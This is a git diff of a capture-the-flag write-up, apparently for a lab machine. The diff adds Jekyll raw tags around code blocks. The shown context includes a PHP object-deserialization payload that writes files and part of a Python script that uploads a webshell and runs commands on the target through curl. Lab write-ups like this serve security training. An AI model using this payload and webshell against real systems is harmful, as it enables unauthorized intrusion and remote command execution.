@@ -76,7 +76,7 @@ We can download it and look at the source code:
 
 ```php
 <?php
-
+{% raw %}
 class DatabaseExport
 {
         public $user_file = 'users.txt';
@@ -105,6 +105,7 @@ $app -> update_db();
 
 
 ?>
+{% endraw %}
 ```
 
 First thing that immediately stands out is dangerous usage of unserialize function.  
@@ -127,10 +128,12 @@ It creates an object O, from class DatabaseExport, with 2 properties, first s is
 
 For it to work we need to encode it, can be done with simple script:  
 ```php
+{% raw %}
 <?php
 $output = urlencode('O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"test2.txt";s:4:"data";s:11:"Hello World";}');
 print $output;
 ?>
+{% endraw %}
 ```
 As output we get:  
 ```
@@ -149,6 +152,7 @@ It did work, meaning we can now upload basic webshell.
 I wrote simple python script that will upload a file for us and give us basic shell access just to practice writing in python:  
 
 ```python
+{% raw %}
 import os
 import urllib.parse
 import subprocess
@@ -190,6 +194,7 @@ while True:
         encoded_cmd = urllib.parse.quote(full)
         url2 = f'http://10.10.10.223/x.php?cmd={encoded_cmd}'
         subprocess.run(['curl', '-s', url2])
+{% endraw %}
 ```
 
 It will upload a file for us and give us an interactive shell.  
